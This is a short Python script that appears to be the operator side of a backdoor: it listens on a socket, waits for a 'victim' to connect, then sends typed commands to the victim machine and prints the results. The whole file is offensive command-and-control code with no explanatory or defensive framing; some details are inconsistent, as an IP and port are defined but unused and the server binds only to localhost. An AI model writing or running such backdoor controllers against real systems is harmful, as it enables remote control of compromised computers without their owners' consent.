import socket


my_ip = '192.168.43.121'
port = 4449
server = socket.socket()
server.bind(('localhost', 8080))
print('[+] Server Started')
print('[+] Listening For Victim')
server.listen(100)
victim, victim_addr = server.accept()
print(f'[+] {victim_addr} Victim opened the backdoor')

while True:
    command = input('Enter Command : ')
    command = command.encode()
    victim.send(command)
    print('[+] Command sent')
    
    output = victim.recv(1024)
    output = output.decode()
    print(f"Output: {output}")
